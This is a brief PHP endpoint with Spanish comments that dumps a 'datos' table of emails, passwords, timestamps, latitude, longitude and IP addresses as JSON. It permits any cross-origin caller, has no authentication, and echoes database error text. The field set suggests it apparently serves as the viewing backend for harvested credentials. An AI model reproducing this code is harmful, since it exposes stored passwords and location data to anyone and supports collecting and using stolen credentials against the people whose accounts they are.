<?php
// Encabezados para permitir CORS y salida en JSON
header("Access-Control-Allow-Origin: *");
header("Content-Type: application/json; charset=UTF-8");

// Incluir el archivo de conexión
require_once './conectorDB.php';
$conexion = conectarDB();

// Consulta para obtener todos los registros
$query = "SELECT id, email, password, fecha, lat, lon, ip FROM datos ORDER BY fecha DESC";
$resultado = $conexion->query($query);

$datos = [];

if ($resultado) {
    while ($fila = $resultado->fetch_assoc()) {
        $datos[] = $fila;
    }

    echo json_encode([
        "status" => "success",
        "data" => $datos
    ]);
} else {
    echo json_encode([
        "status" => "error",
        "message" => "Error al obtener los datos: " . $conexion->error
    ]);
}

$conexion->close();
?>
